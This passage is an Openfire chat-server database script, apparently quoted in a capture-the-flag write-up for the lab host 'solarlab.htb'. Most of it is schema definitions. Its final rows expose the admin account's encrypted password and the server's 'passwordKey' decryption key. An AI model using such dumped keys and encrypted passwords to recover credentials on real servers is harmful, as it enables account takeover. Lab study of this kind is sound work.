<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCCONVERSATIONLOG<span class="token punctuation">(</span>ROOMID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MESSAGEID <span class="token keyword">BIGINT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SENDER <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NICKNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>LOGTIME <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUBJECT <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>BODY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">16777216</span><span class="token punctuation">)</span><span class="token punctuation">,</span>STANZA <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">16777216</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFMUCCONVERSATIONLOG_ROOMTIME_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCCONVERSATIONLOG<span class="token punctuation">(</span>ROOMID<span class="token punctuation">,</span>LOGTIME<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFMUCCONVERSATIONLOG_TIME_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCCONVERSATIONLOG<span class="token punctuation">(</span>LOGTIME<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFMUCCONVERSATIONLOG_MSG_ID <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFMUCCONVERSATIONLOG<span class="token punctuation">(</span>MESSAGEID<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPUBSUBNODE<span class="token punctuation">(</span>SERVICEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NODEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>LEAF <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>CREATIONDATE <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MODIFICATIONDATE <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PARENT <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>DELIVERPAYLOADS <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MAXPAYLOADSIZE <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>PERSISTITEMS <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>MAXITEMS <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>NOTIFYCONFIGCHANGES <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NOTIFYDELETE <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NOTIFYRETRACT <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PRESENCEBASED <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SENDITEMSUBSCRIBE <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PUBLISHERMODEL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUBSCRIPTIONENABLED <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>CONFIGSUBSCRIPTION <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ACCESSMODEL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PAYLOADTYPE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>BODYXSLT <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>DATAFORMXSLT <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CREATOR <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DESCRIPTION <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">LANGUAGE</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>REPLYPOLICY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ASSOCIATIONPOLICY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>MAXLEAFNODES <span class="token keyword">INTEGER</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPUBSUBNODE_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>NODEID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPUBSUBNODEJIDS<span class="token punctuation">(</span>SERVICEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NODEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>JID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ASSOCIATIONTYPE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPUBSUBNODEJIDS_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>NODEID<span class="token punctuation">,</span>JID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPUBSUBNODEGROUPS<span class="token punctuation">(</span>SERVICEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NODEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ROSTERGROUP <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> OFPUBSUBNODEGROUPS_IDX <span class="token keyword">ON</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPUBSUBNODEGROUPS<span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>NODEID<span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPUBSUBAFFILIATION<span class="token punctuation">(</span>SERVICEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NODEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>JID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>AFFILIATION <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPUBSUBAFFILIATION_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>NODEID<span class="token punctuation">,</span>JID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPUBSUBITEM<span class="token punctuation">(</span>SERVICEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NODEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>JID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>CREATIONDATE <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PAYLOAD CLOB<span class="token punctuation">(</span><span class="token number">1</span>G<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPUBSUBITEM_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>NODEID<span class="token punctuation">,</span>ID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPUBSUBSUBSCRIPTION<span class="token punctuation">(</span>SERVICEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NODEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>JID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>OWNER <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>STATE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DELIVER <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DIGEST <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DIGEST_FREQUENCY <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>EXPIRE <span class="token keyword">CHARACTER</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>INCLUDEBODY <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SHOWVALUES <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUBSCRIPTIONTYPE <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUBSCRIPTIONDEPTH <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>KEYWORD <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPUBSUBSUBSCRIPTION_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>NODEID<span class="token punctuation">,</span>ID<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">CREATE</span> MEMORY <span class="token keyword">TABLE</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">.</span>OFPUBSUBDEFAULTCONF<span class="token punctuation">(</span>SERVICEID <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>LEAF <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>DELIVERPAYLOADS <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MAXPAYLOADSIZE <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PERSISTITEMS <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MAXITEMS <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NOTIFYCONFIGCHANGES <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NOTIFYDELETE <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>NOTIFYRETRACT <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PRESENCEBASED <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SENDITEMSUBSCRIBE <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>PUBLISHERMODEL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>SUBSCRIPTIONENABLED <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>ACCESSMODEL <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">LANGUAGE</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>REPLYPOLICY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ASSOCIATIONPOLICY <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>MAXLEAFNODES <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">CONSTRAINT</span> OFPUBSUBDEFAULTCONF_PK <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>SERVICEID<span class="token punctuation">,</span>LEAF<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">ALTER</span> SEQUENCE SYSTEM_LOBS<span class="token punctuation">.</span>LOB_ID RESTART <span class="token keyword">WITH</span> <span class="token number">1</span>
<span class="token keyword">SET</span> <span class="token keyword">DATABASE</span> <span class="token keyword">DEFAULT</span> INITIAL <span class="token keyword">SCHEMA</span> <span class="token keyword">PUBLIC</span>
<span class="token keyword">GRANT</span> <span class="token keyword">USAGE</span> <span class="token keyword">ON</span> DOMAIN INFORMATION_SCHEMA<span class="token punctuation">.</span>SQL_IDENTIFIER <span class="token keyword">TO</span> <span class="token keyword">PUBLIC</span>
<span class="token keyword">GRANT</span> <span class="token keyword">USAGE</span> <span class="token keyword">ON</span> DOMAIN INFORMATION_SCHEMA<span class="token punctuation">.</span>YES_OR_NO <span class="token keyword">TO</span> <span class="token keyword">PUBLIC</span>
<span class="token keyword">GRANT</span> <span class="token keyword">USAGE</span> <span class="token keyword">ON</span> DOMAIN INFORMATION_SCHEMA<span class="token punctuation">.</span>TIME_STAMP <span class="token keyword">TO</span> <span class="token keyword">PUBLIC</span>
<span class="token keyword">GRANT</span> <span class="token keyword">USAGE</span> <span class="token keyword">ON</span> DOMAIN INFORMATION_SCHEMA<span class="token punctuation">.</span>CARDINAL_NUMBER <span class="token keyword">TO</span> <span class="token keyword">PUBLIC</span>
<span class="token keyword">GRANT</span> <span class="token keyword">USAGE</span> <span class="token keyword">ON</span> DOMAIN INFORMATION_SCHEMA<span class="token punctuation">.</span>CHARACTER_DATA <span class="token keyword">TO</span> <span class="token keyword">PUBLIC</span>
<span class="token keyword">GRANT</span> DBA <span class="token keyword">TO</span> SA
<span class="token keyword">SET</span> <span class="token keyword">SCHEMA</span> SYSTEM_LOBS
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> BLOCKS <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2147483647</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">SET</span> <span class="token keyword">SCHEMA</span> <span class="token keyword">PUBLIC</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFUSER <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'gjMoswpK+HakPdvLIvp6eLKlYh0='</span><span class="token punctuation">,</span><span class="token string">'9MwNQcJ9bF4YeyZDdns5gvXp620='</span><span class="token punctuation">,</span><span class="token string">'yidQk5Skw11QJWTBAloAb28lYHftqa0x'</span><span class="token punctuation">,</span><span class="token number">4096</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442'</span><span class="token punctuation">,</span><span class="token string">'Administrator'</span><span class="token punctuation">,</span><span class="token string">'admin@solarlab.htb'</span><span class="token punctuation">,</span><span class="token string">'001700223740785'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFUSERPROP <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'console.rows_per_page'</span><span class="token punctuation">,</span><span class="token string">'/session-summary.jsp=25'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFOFFLINE <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'001700223778861'</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token string">'&lt;message from="solarlab.htb" to="admin@solarlab.htb">&lt;body>A server or plugin update was found: Openfire 4.7.5&lt;/body>&lt;/message>'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFOFFLINE <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'001700223779069'</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token string">'&lt;message from="solarlab.htb" to="admin@solarlab.htb">&lt;body>A server or plugin update was found: Search 1.7.4&lt;/body>&lt;/message>'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFOFFLINE <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'001714131992714'</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token string">'&lt;message from="solarlab.htb" to="admin@solarlab.htb">&lt;body>A server or plugin update was found: Openfire 4.8.1&lt;/body>&lt;/message>'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFOFFLINE <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'001714131993136'</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token string">'&lt;message from="solarlab.htb" to="admin@solarlab.htb">&lt;body>A server or plugin update was found: Search 1.7.4&lt;/body>&lt;/message>'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFOFFLINE <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'001715023572659'</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token string">'&lt;message from="solarlab.htb" to="admin@solarlab.htb">&lt;body>A server or plugin update was found: Openfire 4.8.1&lt;/body>&lt;/message>'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFOFFLINE <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">'001715023572956'</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token string">'&lt;message from="solarlab.htb" to="admin@solarlab.htb">&lt;body>A server or plugin update was found: Search 1.7.4&lt;/body>&lt;/message>'</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFID <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFID <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFID <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFID <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFID <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFID <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'cache.MUCService''conference''RoomStatistics.maxLifetime'</span><span class="token punctuation">,</span><span class="token string">'-1'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'cache.MUCService''conference''RoomStatistics.size'</span><span class="token punctuation">,</span><span class="token string">'-1'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'cache.MUCService''conference''Rooms.maxLifetime'</span><span class="token punctuation">,</span><span class="token string">'-1'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'cache.MUCService''conference''Rooms.size'</span><span class="token punctuation">,</span><span class="token string">'-1'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'passwordKey'</span><span class="token punctuation">,</span><span class="token string">'hGXiFzsKaAeYLjn'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'provider.admin.className'</span><span class="token punctuation">,</span><span class="token string">'org.jivesoftware.openfire.admin.DefaultAdminProvider'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> OFPROPERTY <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'provider.auth.className'</span><span class="token punctuation">,</span><span class="token string">'org.jivesoftware.openfire.auth.DefaultAuthProvider'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span>
